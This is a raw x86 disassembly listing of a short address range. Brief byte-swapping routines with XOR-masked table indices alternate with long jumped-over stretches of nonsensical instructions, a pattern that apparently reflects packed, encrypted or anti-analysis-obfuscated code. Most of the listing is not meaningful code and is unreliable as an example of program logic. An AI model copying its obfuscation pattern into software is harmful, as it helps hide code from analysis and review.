  404aa2:	retf   
  404aa3:	cmp    eax,0x45c7fbd5
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0xe73c6a28
  404b32:	loope  0x404ba9
  404b34:	pushf  
  404b35:	mov    ds:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404bbb
  404b3e:	imul   BYTE PTR [eax+0x63]
  404b41:	mov    ds:0xc7eb9044,eax
  404b46:	or     ebx,DWORD PTR [ecx+0x69ceb212]
  404b4c:	xor    al,0x2
  404b4e:	pop    eax
  404b4f:	imul   ebp,DWORD PTR [edi+edi*1],0x98cc5108
  404b56:	mov    DWORD PTR [ebx+ebp*1-0x7f178586],ebp
  404b5d:	out    dx,eax
  404b5e:	call   0x3697:0x137c2c19
  404b65:	lock push cs
  404b67:	sbb    al,0x0
  404b69:	sub    dl,BYTE PTR [eax]
  404b6b:	test   DWORD PTR [ecx+0x4d],ebp
  404b6e:	aad    0xb6
  404b70:	push   ebp
  404b71:	adc    ebp,DWORD PTR [edx-0x42]
  404b74:	mov    eax,0x43eb5da
  404b79:	push   ss
  404b7a:	mov    dh,0xf6
  404b7c:	inc    ebx
  404b7d:	sbb    bl,BYTE PTR gs:[edi+0x50]
  404b81:	add    eax,0x6fc6e73a
  404b86:	dec    eax
  404b87:	dec    ebp
  404b88:	(bad)  
  404b89:	frstor [ecx+ebx*1+0x24f83b79]
  404b90:	sub    bl,dl
  404b92:	fucomi st,st(5)
  404b94:	mov    ch,0x5c
  404b96:	repnz add eax,0xcc71466d
  404b9c:	sub    esp,DWORD PTR [eax-0x7d2a2827]
  404ba2:	hlt    
  404ba3:	fidiv  DWORD PTR [ebx+eiz*4+0x5e]
  404ba7:	lods   eax,DWORD PTR ds:[esi]
  404ba8:	inc    edi
  404ba9:	inc    esi
  404baa:	out    dx,eax
  404bab:	imul   eax,edi,0x47
  404bae:	push   edi
  404baf:	mov    esi,0x5cafd860
  404bb4:	mov    ch,0x1a
  404bb6:	xor    BYTE PTR [edi+0x515c1ac9],bh
  404bbc:	lahf   
  404bbd:	push   0x54
  404bbf:	call   0x648a7cf3
  404bc4:	fmul   DWORD PTR [edi]
  404bc6:	jp     0x404bb0
  404bc8:	push   cs
  404bc9:	pop    ecx
  404bca:	jno    0x404b60
  404bcc:	sub    al,0xb5
  404bce:	fld    QWORD PTR [ebp-0x334b31ac]
  404bd4:	or     DWORD PTR [eax-0x22],0xffffffec
  404bd8:	cmp    BYTE PTR [ecx+0x20],ch
  404bdb:	push   esp
  404bdc:	aaa    
  404bdd:	add    BYTE PTR [edi-0x75926f59],0x86
  404be4:	shr    BYTE PTR [edx+0x1f],1
  404be7:	ja     0x404bf9
  404be9:	pop    ebx
  404bea:	mov    DWORD PTR [eax],edx
  404bec:	cmp    DWORD PTR [esp+eiz*8-0x38d0b9d8],ebx
  404bf3:	pop    edi
  404bf4:	arpl   WORD PTR [edi-0x595451a1],sp
  404bfa:	cs jmp 0xcbc44902
  404c00:	sbb    BYTE PTR [esi+esi*4],ah
  404c03:	(bad)  
  404c04:	adc    eax,0x745e095c
  404c09:	imul   esp,DWORD PTR [ebp+eax*4+0x60e83d5a],0x689588d4
  404c14:	push   0xf1643b67
  404c19:	ror    BYTE PTR [ecx+0x1b],1
  404c1c:	adc    ch,BYTE PTR [eax]
  404c1e:	ret    
  404c1f:	sti    
  404c20:	gs or  cl,cl
  404c23:	adc    cl,al
  404c25:	(bad)  
  404c26:	push   eax
  404c27:	inc    edx
  404c28:	and    ebp,DWORD PTR [edx+0x76]
  404c2b:	mov    bh,0xa5
  404c2d:	or     esi,esi
  404c2f:	dec    esi
  404c30:	outs   dx,BYTE PTR ds:[esi]
  404c31:	shl    DWORD PTR [edi-0x3b],0x47
  404c35:	pop    ecx
  404c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c37:	xchg   ebp,eax
  404c38:	dec    eax
  404c39:	aaa    
  404c3a:	xlat   BYTE PTR ds:[ebx]
  404c3b:	push   ebp
  404c3c:	into   
  404c3d:	leave  
  404c3e:	mov    ch,0xd
  404c40:	and    bh,bh
  404c42:	cmp    al,0x90
  404c44:	and    dh,dh
  404c46:	les    ebx,FWORD PTR [edi-0x45]
  404c49:	push   esi
  404c4a:	or     eax,DWORD PTR ds:0x68496db5
  404c50:	mov    ebx,0xbfce5ee2
  404c55:	pushf  
  404c56:	aad    0x29
  404c58:	dec    esp
  404c59:	imul   eax,DWORD PTR ds:0xb139c1e8,0xffffff8b
  404c60:	mov    dh,BYTE PTR [ecx-0x37]
  404c63:	and    dl,BYTE PTR [ecx]
  404c65:	loopne 0x404c3f
  404c67:	fucomp st(0)
  404c69:	cmp    BYTE PTR [edx-0x76957fa],0xa8
  404c70:	cs jecxz 0x404c48
  404c73:	sbb    eax,DWORD PTR [esi+0x44]
  404c76:	test   DWORD PTR [ecx-0x52],ebx
  404c79:	pop    eax
  404c7a:	sti    
  404c7b:	cmp    BYTE PTR [eax],bl
  404c7d:	xchg   cl,dl
  404c7f:	dec    esi
  404c80:	xor    al,0xb
  404c82:	adc    eax,0xf5407fcb
  404c87:	dec    ebp
  404c88:	ror    BYTE PTR [eax+0x12117172],0xd6
  404c8f:	push   esp
  404c90:	dec    ecx
  404c91:	dec    ebx
  404c92:	mov    ch,0x2f
  404c94:	push   edi
  404c95:	stos   DWORD PTR es:[edi],eax
  404c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c97:	int3   
  404c98:	xchg   ecx,eax
  404c99:	sub    esi,DWORD PTR [esi-0x12473ee7]
  404c9f:	test   DWORD PTR [edi],edx
  404ca1:	or     ah,BYTE PTR [edx+eiz*1+0x1a]
  404ca5:	mov    WORD PTR [ecx],es
  404ca7:	xor    BYTE PTR [edi+0x1e],dh
  404caa:	and    BYTE PTR ds:0x81537b28,ch
  404cb0:	les    ebx,FWORD PTR [esi+eax*8-0x6095cd9]
  404cb7:	enter  0x71bb,0xc4
  404cbb:	je     0x404d21
  404cbd:	sub    al,0xd9
  404cbf:	xchg   edx,eax
  404cc0:	sbb    al,0x91
  404cc2:	mov    ecx,0x299ee9a1
  404cc7:	mov    esp,0x2e49b3a8
  404ccc:	mov    ch,BYTE PTR [edx]
  404cce:	mov    esi,DWORD PTR [edi+0x39]
  404cd1:	xchg   ebx,eax
  404cd2:	in     eax,dx
  404cd3:	bound  esi,QWORD PTR [ebx]
  404cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd6:	out    dx,eax
  404cd7:	pushf  
  404cd8:	shl    BYTE PTR [esi+0x53],1
  404cdb:	repz shl DWORD PTR [ebp-0x2a23f2fb],cl
  404ce2:	add    BYTE PTR [ebx+0x53],dh
  404ce5:	out    0xcb,eax
  404ce7:	aam    0x29
  404ce9:	cmp    dl,BYTE PTR [ebp+0x54e9585d]
  404cef:	mov    esi,0xf0fef1e4
  404cf4:	push   ss
  404cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cf6:	jno    0x404d0d
  404cf8:	cwde   
  404cf9:	mov    cl,0x40
  404cfb:	add    bl,BYTE PTR [edi+0x77a9e851]
  404d01:	mov    cl,0x28
  404d03:	mov    edi,0x71e20665
  404d08:	or     eax,0x9a411dd9
  404d0d:	jno    0x404d79
  404d0f:	dec    eax
  404d10:	dec    DWORD PTR [esi]
  404d12:	inc    esp
  404d13:	sub    eax,0x49af62ac
  404d18:	dec    esi
  404d19:	cld    
  404d1a:	cmp    BYTE PTR [ebx+0x18],al
  404d1d:	mov    eax,ds:0x1a5aaf62
  404d22:	inc    esi
  404d23:	jp     0x404d84
  404d25:	pop    esp
  404d26:	rol    ecx,cl
  404d28:	cmp    esi,DWORD PTR [eax-0x1c0d8765]
  404d2e:	aaa    
  404d2f:	nop
  404d30:	xor    al,0x1
  404d32:	fwait
  404d33:	stos   BYTE PTR es:[edi],al
  404d34:	jns    0x404d13
  404d36:	in     eax,dx
  404d37:	adc    BYTE PTR [eax-0x707b46d4],al
  404d3d:	push   ss
  404d3e:	(bad)  
  404d3f:	jmp    0xa867fd7a
  404d44:	sbb    edx,DWORD PTR [ebx-0x7c]
  404d47:	out    0xb1,al
  404d49:	dec    eax
  404d4a:	cmc    
  404d4b:	and    eax,0x3c0a904
  404d50:	scas   eax,DWORD PTR es:[edi]
  404d51:	mov    al,ds:0x6294cecd
  404d56:	xor    al,0xb7
  404d58:	fisttp QWORD PTR [esi]
  404d5a:	pandn  mm6,QWORD PTR [ebp+eiz*4+0x44]
  404d5f:	add    eax,0x2a71981c
  404d64:	loop   0x404dd6
  404d66:	mov    eax,ds:0xab37a84f
  404d6b:	xor    edx,DWORD PTR [esi+0x41]
  404d6e:	(bad)  
  404d6f:	xor    bh,BYTE PTR [ebx]
  404d71:	mov    ecx,0x777bfc0e
  404d76:	add    BYTE PTR [ebx+0x775278ff],cl
  404d7c:	dec    edi
  404d7d:	ins    BYTE PTR es:[edi],dx
  404d7e:	sub    bh,al
  404d80:	test   eax,0x8ce98f34
  404d85:	xchg   edi,eax
  404d86:	cmc    
  404d87:	inc    edi
  404d88:	ins    BYTE PTR es:[edi],dx
  404d89:	push   esp
  404d8a:	cmp    eax,0x27c073d3
  404d8f:	pusha  
  404d90:	out    dx,eax
  404d91:	fisub  DWORD PTR [ebx-0x4a2e705]
  404d97:	lahf   
  404d98:	js     0x404e15
  404d9a:	out    dx,eax
  404d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d9c:	sbb    dh,BYTE PTR [eax]
  404d9e:	or     BYTE PTR [edx],0x95
  404da1:	cmp    esp,DWORD PTR ds:0xe0699ecd
  404da7:	rcr    DWORD PTR [ecx-0x6f],cl
  404daa:	sti    
  404dab:	jns    0x404d75
  404dad:	imul   ecx,DWORD PTR [eax+0x33],0xffffffb3
  404db1:	test   eax,0x61ab4e71
  404db6:	or     al,0x8f
  404db8:	ret    0xfc3f
  404dbb:	(bad)  
  404dbc:	sahf   
  404dbd:	repnz push esi
  404dbf:	xchg   edx,eax
  404dc0:	aad    0xf7
  404dc2:	xchg   esi,eax
  404dc3:	mov    ch,0x4d
  404dc5:	and    ecx,DWORD PTR [ebp-0x6a]
  404dc8:	daa    
  404dc9:	mov    dl,0x29
  404dcb:	jg     0x404dda
  404dcd:	rol    ebx,cl
  404dcf:	pop    edi
  404dd0:	cmp    DWORD PTR [ebp+0x79],edi
  404dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd4:	cld    
  404dd5:	and    DWORD PTR [esi+0x33006c12],edx
  404ddb:	add    dl,0x6
  404dde:	ret    
  404ddf:	adc    BYTE PTR [esi],bl
  404de1:	mov    bl,0x4b
  404de3:	or     cl,bh
  404de5:	xchg   ebx,eax
  404de6:	retf   
  404de7:	pop    esi
  404de8:	test   DWORD PTR [edi],ebp
  404dea:	cmp    eax,0x625bc25f
  404def:	add    eax,DWORD PTR [ebx]
  404df1:	cwde   
  404df2:	nop
  404df3:	psubd  mm7,mm5
  404df6:	mov    ss,WORD PTR [edi-0x2c972639]
  404dfc:	hlt    
  404dfd:	xlat   BYTE PTR ds:[ebx]
  404dfe:	pusha  
  404dff:	test   edx,ecx
  404e01:	mov    esp,0x4a57e174
  404e06:	pop    esi
  404e07:	push   esp
  404e08:	js     0x404e2e
  404e0a:	xor    edx,DWORD PTR ds:0xeb42386d
  404e10:	xchg   esi,eax
  404e11:	rcl    BYTE PTR [esi-0x10532aa6],0x8c
  404e18:	arpl   WORD PTR [eax-0x41],cx
  404e1b:	ret    0x24f
  404e1e:	ss aas 
  404e20:	retf   
  404e21:	mov    edi,0xff90323
  404e26:	scas   eax,DWORD PTR es:[edi]
  404e27:	xlat   BYTE PTR ds:[ebx]
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404e02
  404e5e:	mov    ebx,0x218c5957
  404e63:	jle    0x404ee3
  404e65:	pop    eax
  404e66:	jl     0x404ee6
  404e68:	jle    0x404e7a
  404e6a:	xchg   ebp,eax
  404e6b:	stos   BYTE PTR es:[edi],al
  404e6c:	pusha  
  404e6d:	sbb    al,0x4
  404e6f:	mov    bl,0x24
  404e71:	aad    0x94
  404e73:	jle    0x404e41
  404e75:	rcr    DWORD PTR [esi+0x2d],1
  404e78:	loop   0x404eb2
  404e7a:	mov    dl,BYTE PTR [esi]
  404e7c:	shl    dl,0xde
  404e7f:	scas   eax,DWORD PTR es:[edi]
  404e80:	out    dx,al
  404e81:	mov    ecx,0xa2d2506d
  404e86:	add    ebx,DWORD PTR [esi+0x53]
  404e89:	pop    esi
  404e8a:	adc    cl,BYTE PTR [ebx+esi*4+0x1d]
  404e8e:	push   esi
  404e8f:	fwait
  404e90:	cmp    BYTE PTR [eax],0x40
  404e93:	ins    DWORD PTR es:[edi],dx
  404e94:	iret   
  404e95:	into   
  404e96:	or     DWORD PTR [edi],ecx
  404e98:	mov    esp,0xa234cefd
  404e9d:	push   ebp
  404e9e:	ret    
  404e9f:	sti    
  404ea0:	mov    ds:0x34b38e23,al
  404ea5:	and    DWORD PTR [esi+0x67fd53f4],edi
  404eab:	cs jnp 0x404ee0
  404eae:	push   esp
  404eaf:	ins    BYTE PTR es:[edi],dx
  404eb0:	sbb    eax,0x5712bd40
  404eb5:	int3   
  404eb6:	mov    cl,0xbe
  404eb8:	out    dx,al
  404eb9:	dec    esp
  404eba:	mov    ecx,0xb90ea696
  404ebf:	mov    esi,edi
  404ec1:	dec    ebx
  404ec2:	lahf   
  404ec3:	(bad)  
  404ec4:	jnp    0x404e94
  404ec6:	aad    0xf9
  404ec8:	mov    esi,0x2a635320
  404ecd:	mov    al,BYTE PTR [eax]
  404ecf:	fcmovnb st,st(3)
  404ed1:	(bad)  
  404ed3:	(bad)  
  404ed5:	and    al,0x4b
  404ed7:	sub    esi,ebp
  404ed9:	data16 and bh,BYTE PTR ds:[esi+esi*8-0x39]
  404edf:	adc    BYTE PTR [esi-0x3b],dl
  404ee2:	das    
  404ee3:	mov    dl,0xe5
  404ee5:	pop    esp
  404ee6:	mov    es:0xbf8511f7,eax
  404eec:	add    al,0xe8
  404eee:	push   edi
  404eef:	adc    DWORD PTR [ecx-0x15],esi
  404ef2:	js     0x404efa
  404ef4:	xchg   edi,eax
  404ef5:	cmp    bh,BYTE PTR [ebx]
  404ef7:	mov    fs,WORD PTR [esi+0x77]
  404efa:	lods   al,BYTE PTR ds:[esi]
  404efb:	test   al,0xa4
  404efd:	jg     0x404f4f
  404eff:	out    dx,al
  404f00:	xor    DWORD PTR [edx],edi
  404f02:	inc    ecx
  404f03:	xchg   edx,eax
  404f04:	inc    esi
  404f05:	(bad)  
  404f06:	fisubr DWORD PTR [ebx+0x373554c6]
  404f0c:	ret    
  404f0d:	pop    ebx
  404f0e:	jecxz  0x404f40
  404f10:	mov    eax,0x33735989
  404f15:	fs inc ebx
  404f17:	in     al,0xeb
  404f19:	and    al,0x8e
  404f1b:	dec    DWORD PTR [edi+0x799355e1]
  404f21:	mov    ah,0x78
  404f23:	jge    0x404f56
  404f25:	pop    es
  404f26:	inc    esi
  404f27:	push   es
  404f28:	add    ecx,ecx
  404f2a:	cmp    eax,0x20aee50d
  404f2f:	adc    dh,BYTE PTR ds:0x4bcd7959
  404f35:	es jmp 0xfa03ffb6
  404f3b:	jmp    0x566d:0xe3b21a1a
  404f42:	leave  
  404f43:	ret    
  404f44:	jle    0x404fa5
  404f46:	outs   dx,DWORD PTR ds:[esi]
  404f47:	sbb    BYTE PTR [di+0x5fd0],cl
  404f4c:	div    ecx
  404f4e:	pusha  
  404f4f:	mov    al,0xe3
  404f51:	sbb    edi,edx
  404f53:	or     DWORD PTR [ecx+eiz*8+0x7cdf0a58],ebp
  404f5a:	not    dh
  404f5c:	jo     0x404fa4
  404f5e:	iret   
  404f5f:	cdq    
  404f60:	xchg   ebp,eax
  404f61:	jmp    0xdabd:0xa2fa6eb9
  404f68:	xor    bl,BYTE PTR [edi]
  404f6a:	mov    WORD PTR [edx+0x3b],fs
  404f6d:	and    eax,0xbef38eee
  404f72:	call   0x68ef:0x40cafa20
  404f79:	gs retf 0x4b67
  404f7d:	mov    eax,ds:0x9653eede
  404f82:	fs daa 
  404f84:	inc    ebx
  404f85:	jns    0x404fb9
  404f87:	iret   
  404f88:	jne    0x404f94
  404f8a:	fwait
  404f8b:	or     ecx,0xffffffd6
  404f8e:	sbb    eax,0xfd230411
  404f93:	retf   0x57c1
  404f96:	jbe    0x404f7c
  404f98:	or     DWORD PTR [ecx+0x73],ecx
  404f9b:	sbb    eax,0x98078c5c
  404fa0:	adc    al,BYTE PTR ds:0xc5112b13
  404fa6:	loopne 0x404f55
  404fa8:	iret   
  404fa9:	add    ebp,ebp
  404fab:	dec    edx
  404fac:	aaa    
  404fad:	stc    
  404fae:	in     eax,0x19
  404fb0:	fcomi  st,st(1)
  404fb2:	retf   0xa0d1
  404fb5:	dec    eax
  404fb6:	lock adc ecx,DWORD PTR [edi-0x1c]
  404fba:	push   0xd95f2338
  404fbf:	out    dx,eax
  404fc0:	lods   al,BYTE PTR ds:[esi]
  404fc1:	arpl   ax,bx
  404fc3:	mov    al,0x95
  404fc5:	pop    ebx
  404fc6:	ja     0x404ff0
  404fc8:	bound  eax,QWORD PTR [ecx-0x7a5c4b2f]
  404fce:	repnz push eax
  404fd0:	and    cl,BYTE PTR [edi+0x61e828ad]
  404fd6:	xchg   DWORD PTR [esi],eax
  404fd8:	imul   dx,WORD PTR [esi],0xffd0
  404fdc:	shl    DWORD PTR [edx],1
  404fde:	push   eax
  404fdf:	jae    0x404fea
  404fe1:	inc    edx
  404fe2:	sbb    eax,0x52b2b14a
  404fe7:	lods   al,BYTE PTR ds:[esi]
  404fe8:	fistp  DWORD PTR [ecx]
  404fea:	sub    BYTE PTR ds:0x61d7cc0b,dh
  404ff0:	fistp  WORD PTR [esi+esi*2+0x5f]
  404ff4:	ficomp WORD PTR [esi+ebx*2]
  404ff7:	xchg   edx,eax
  404ff8:	add    BYTE PTR [ebx-0x44],ch
  404ffb:	pop    esp
  404ffc:	jmp    0x24f48c1f
  405001:	xchg   DWORD PTR [ecx],ecx
  405003:	push   edi
  405004:	cld    
  405005:	sahf   
  405006:	test   al,0x35
  405008:	pop    DWORD PTR [ebx+0x5f614fa0]
  40500e:	pop    edx
  40500f:	sub    ch,BYTE PTR [ebx]
  405011:	bound  edx,QWORD PTR [ecx+0x71]
  405014:	cmp    BYTE PTR [ecx+0x224df692],bh
  40501a:	fidiv  DWORD PTR [ebp-0x57]
  40501d:	das    
  40501e:	mov    BYTE PTR [eax-0x3b64a35a],bl
  405024:	mov    al,0xf0
  405026:	xchg   edi,eax
  405027:	mov    ebp,DWORD PTR [esi+0x50291486]
  40502d:	inc    ebx
  40502e:	push   es
  40502f:	inc    ecx
  405030:	ins    DWORD PTR es:[edi],dx
  405031:	or     al,0x34
  405033:	cmc    
  405034:	test   BYTE PTR [esi+0x170851a],dl
  40503a:	mov    ds:0xe1762a1f,eax
  40503f:	lds    ebp,FWORD PTR [edx+0x5e54e3e4]
  405045:	push   ebp
  405046:	popf   
  405047:	aaa    
  405048:	test   BYTE PTR [esi],cl
  40504a:	mov    al,ds:0x67b9af69
  40504f:	xchg   BYTE PTR [edi],dh
  405051:	add    BYTE PTR [edi-0x5e9f40d3],dl
  405057:	ret    
  405058:	cld    
  405059:	shl    BYTE PTR [edi-0x6323c97b],cl
  40505f:	push   0xffffffad
  405061:	loopne 0x404ffc
  405063:	retf   0x61b5
  405066:	call   0x6884:0x8b595964
  40506d:	or     al,BYTE PTR [esi-0x4b455ded]
  405073:	retf   
  405074:	adc    BYTE PTR [edx+edi*2-0x50bff9f3],ah
  40507b:	out    0x3d,al
  40507d:	stos   BYTE PTR es:[edi],al
  40507e:	mov    ch,0x8d
  405080:	shr    DWORD PTR [esi+0x4c4905c8],1
  405086:	mov    eax,ds:0x93ed633
  40508b:	fild   DWORD PTR [esi+0x235a92ee]
  405091:	mov    cl,BYTE PTR [edx-0x3079c10f]
  405097:	xchg   esi,eax
  405098:	mov    ebx,0x253cce7d
  40509d:	inc    ebx
  40509e:	xchg   ebx,eax
  40509f:	lds    ebx,FWORD PTR [ebx]
  4050a1:	pop    edx
  4050a2:	popf   
  4050a3:	test   BYTE PTR [eax],bl
  4050a5:	mov    cl,0x5a
  4050a7:	add    al,0xb5
  4050a9:	mov    ebx,0xd0290f10
  4050ae:	loopne 0x4050a1
  4050b0:	inc    cx
  4050b2:	adc    ecx,edx
  4050b4:	mov    edx,DWORD PTR [eax+0xb1199fc]
  4050ba:	adc    BYTE PTR [ecx],0xa2
  4050bd:	push   ds
  4050be:	mov    al,ds:0x60fb7eac
  4050c3:	aad    0x39
  4050c5:	push   esi
  4050c6:	cld    
  4050c7:	popa   
  4050c8:	cmp    bh,cl
  4050ca:	xchg   DWORD PTR [ecx],ecx
  4050cc:	fstp   QWORD PTR [esi]
  4050ce:	pop    esp
  4050cf:	sbb    esp,DWORD PTR cs:[eax+0x62bc790a]
  4050d6:	and    al,0xe3
  4050d8:	sbb    dh,0x61
  4050db:	cmp    ch,BYTE PTR [edx+0x2b]
  4050de:	mov    BYTE PTR [ebx],al
  4050e0:	(bad)  
  4050e1:	dec    ecx
  4050e2:	inc    ebp
  4050e3:	jmp    0x10ab29ac
  4050e8:	jbe    0x4050ef
  4050ea:	cmp    eax,0x7cfa2b01
  4050ef:	shr    BYTE PTR [ebx-0x3f8279fb],1
  4050f5:	dec    eax
  4050f6:	scas   al,BYTE PTR es:[edi]
  4050f7:	sub    DWORD PTR [ebx-0x61017fb1],ebx
  4050fd:	mov    ?,WORD PTR [eax-0x52]
  405100:	xchg   edi,eax
  405101:	sti    
  405102:	xchg   ecx,eax
  405103:	je     0x4050a1
  405105:	test   BYTE PTR [ebp+0x53de83c4],cl
  40510b:	loopne 0x4050b8
  40510d:	jle    0x40514d
  40510f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405110:	jne    0x4050ec
  405112:	mov    eax,ds:0xf2caee78
  405117:	dec    edx
  405118:	retf   0x18de
  40511b:	push   ecx
  40511c:	ds aaa 
  40511e:	xchg   edi,eax
  40511f:	cmp    eax,0x5cff5974
  405124:	imul   ebx,DWORD PTR [edx],0xffffff86
  405127:	and    ebp,DWORD PTR [ebx+0x563dd8bf]
  40512d:	mov    DWORD PTR ds:0xc2dfb539,ebx
  405133:	jl     0x4050c6
  405135:	xor    dh,BYTE PTR [eax+0x3e0548b6]
  40513b:	or     esi,esi
  40513d:	fist   WORD PTR [ecx]
  40513f:	int    0x62
  405141:	xchg   edx,eax
  405142:	cmp    ebp,DWORD PTR [ebp+0x22]
  405145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405146:	jb     0x405166
  405148:	sub    eax,0x22d9bdb7
  40514d:	cmp    eax,0xfbaf0fa8
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	sbb    al,0xde
  405173:	mov    esi,0x7e2cf635
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051fa
  40517e:	xchg   ebx,eax
  40517f:	je     0x405129
  405181:	add    BYTE PTR [edi-0xd],al
  405184:	mov    BYTE PTR [esp+ebp*4],cl
  405187:	arpl   WORD PTR [si+0x7b04],cx
  40518c:	out    0x55,eax
  40518e:	imul   edi,DWORD PTR [edx],0xffffffb7
  405191:	add    eax,0xef0478b
  405196:	sub    eax,0x676afdd8
  40519b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40519c:	rol    BYTE PTR [ebx+0x41],1
  40519f:	lods   eax,DWORD PTR ds:[esi]
  4051a0:	and    al,0xc6
  4051a2:	jmp    0xe489:0xbd6330a9
  4051a9:	push   ebp
  4051aa:	ins    DWORD PTR es:[edi],dx
  4051ab:	or     eax,0xec04e555
  4051b0:	lds    esp,FWORD PTR [edx+0x68]
  4051b3:	mov    al,0x5
  4051b5:	(bad)  
  4051b7:	jae    0x4051d8
  4051b9:	xchg   ebx,eax
  4051ba:	nop
  4051bb:	ret    
  4051bc:	or     eax,0x6fd27231
  4051c1:	push   eax
  4051c2:	pusha  
  4051c3:	dec    ecx
  4051c4:	ror    dh,cl
  4051c6:	(bad)  
  4051c8:	jo     0x4051e8
  4051ca:	popa   
  4051cb:	mov    al,0xa5
  4051cd:	shl    DWORD PTR [eax+0x4e],cl
  4051d0:	jle    0x405174
  4051d2:	ja     0x405186
  4051d4:	mov    al,ds:0xa67b0bc9
  4051d9:	push   0x69
  4051db:	in     eax,0x10
  4051dd:	aas    
  4051de:	shl    bh,cl
  4051e0:	pop    ebx
  4051e1:	ja     0x4051f0
  4051e3:	daa    
  4051e4:	sbb    eax,0x3b3d9656
  4051e9:	test   al,0x6d
  4051eb:	mov    cl,0x3f
  4051ed:	into   
  4051ee:	loope  0x405200
  4051f0:	hlt    
  4051f1:	push   eax
  4051f2:	stos   BYTE PTR es:[edi],al
  4051f3:	loopne 0x4051aa
  4051f5:	into   
  4051f6:	idiv   BYTE PTR ds:0x9db3a135
  4051fc:	loopne 0x4051de
  4051fe:	jmp    0x8b0bd1b9
  405203:	jp     0x4051f6
  405205:	dec    ebp
  405206:	xchg   esp,eax
  405207:	jmp    0x40525d
  405209:	mov    eax,ds:0xc10caea7
  40520e:	pop    ds
  40520f:	js     0x4051b0
  405211:	(bad)  
  405212:	sub    al,0xc3
  405214:	mul    cl
  405216:	jmp    0x40519a
  405218:	push   ds
  405219:	(bad)  
  40521a:	cli    
  40521b:	mov    ah,0x61
  40521d:	sub    al,0xad
  40521f:	push   ss
  405220:	add    ebp,eax
  405222:	push   esi
  405223:	jmp    0x405211
  405225:	sub    bh,BYTE PTR [edx-0xe]
  405228:	xor    ebx,DWORD PTR es:[edi+0x7e]
  40522c:	(bad)  
  40522d:	popf   
  40522e:	call   0x7b45a68b
  405233:	test   DWORD PTR [eax],ebp
  405235:	imul   edx,DWORD PTR [edi],0x6a925757
  40523b:	pusha  
  40523c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40523d:	xor    edi,DWORD PTR gs:[esp+ebx*1-0x2afaf4a4]
  405245:	test   eax,0x4c38816b
  40524a:	lods   al,BYTE PTR ds:[esi]
  40524b:	retf   
  40524c:	cs jbe 0x40525d
  40524f:	je     0x40528b
  405251:	jb     0x405210
  405253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405254:	dec    ecx
  405255:	fdiv   DWORD PTR [edx-0x5a]
  405258:	fld    QWORD PTR [edx+ebp*8+0x28]
  40525c:	mov    al,ds:0xefcf3e4e
  405261:	dec    esp
  405262:	adc    BYTE PTR [eax-0x72],ch
  405265:	dec    eax
